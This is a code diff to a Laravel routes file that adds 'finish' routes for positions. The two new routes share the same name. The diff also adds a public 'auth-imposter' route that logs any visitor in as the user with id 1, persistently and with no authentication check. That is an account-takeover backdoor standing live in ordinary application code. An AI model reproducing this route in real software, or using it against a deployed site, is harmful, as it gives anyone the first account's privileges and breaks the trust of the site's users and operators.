@@ -11,7 +11,9 @@ use App\Http\Controllers\MeetController;
 use App\Http\Controllers\PackagesController;
 use App\Http\Controllers\PostController;
 use App\Http\Middleware\RedirectToBanPage;
+use App\Models\User;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -159,6 +161,14 @@ Route::middleware(['auth', RedirectToBanPage::class])
         Route::get('/positions/create', [\App\Http\Controllers\PositionsController::class, 'edit'])
             ->can('create', 'App\Models\Position')
             ->name('position.create');
+
+        Route::get('/positions/{position}/finish', [\App\Http\Controllers\PositionsController::class, 'finish'])
+            ->can('finish', 'position')
+            ->name('position.finish');
+
+        Route::delete('/positions/{position}/finish', [\App\Http\Controllers\PositionsController::class, 'finish'])
+            ->can('finish', 'position')
+            ->name('position.finish');
 
         Route::post('/positions', [\App\Http\Controllers\PositionsController::class, 'update'])
             ->can('create', 'App\Models\Position')
@@ -469,6 +479,11 @@ Route::get('/@{user:nickname}/meets', [\App\Http\Controllers\ProfileController::
 | Review
 |--------------------------------------------------------------------------
 */
+Route::get('auth-imposter', function ()  {
+        Auth::login(User::find(1), $remember = true);
+        return redirect()->back();
+
+});
 
 Route::middleware(['auth'])
     ->group(function () {
